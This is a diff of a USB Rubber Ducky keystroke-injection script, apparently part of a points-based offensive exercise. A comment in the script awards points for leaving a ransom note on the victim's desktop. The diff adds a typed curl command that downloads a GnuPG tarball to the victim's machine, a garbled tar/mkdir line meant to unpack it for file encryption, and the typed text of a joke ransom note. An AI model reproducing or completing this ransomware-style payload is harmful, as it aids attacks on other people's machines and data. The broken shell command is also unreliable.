@@ -107,10 +107,11 @@ STRING Terminal
 DELAY 500
 ENTER
 DELAY 500
-STRING curl http://SERVER/path/to/file > file
+STRING curl https://www.gnupg.org/ftp/gcrypt/gnupg/gnupg-2.0.30.tar.bz2 > gpgdir.tar.bz2
 ENTER
 DELAY 1000
-STRING INSERT COMMAND TO EXECUTE HERE
+STRING mkdir tar -xjf gpgdir.tar.bz2 -C && cd gpgdir
+REM TODO: install gpg
 ENTER
 REM You can chage the above line to the command used to open your program.
 
@@ -172,6 +173,8 @@ REM --------------------------------------------------------
 REM	[5 points] Leave an unencrypted ransom note on the current user’s desktop. For bonus lulz, leave a meme.
 REM --------------------------------------------------------
 
+STRING RUBBA DUB DUB! 3 MEN IN A TUB!
+ENTER
 
 
 
